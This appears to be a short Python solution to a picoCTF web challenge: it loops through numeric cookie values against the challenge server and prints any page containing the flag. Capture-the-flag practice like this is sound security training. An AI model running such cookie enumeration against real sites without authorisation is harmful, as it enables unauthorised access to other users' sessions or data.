import requests

url = 'http://mercury.picoctf.net:6418/'

for i in range(0, 20):
    cookies = dict(name=str(i))
    r = requests.get(url, cookies=cookies)
    if 'picoCTF' in r.text:
        print(r.text)
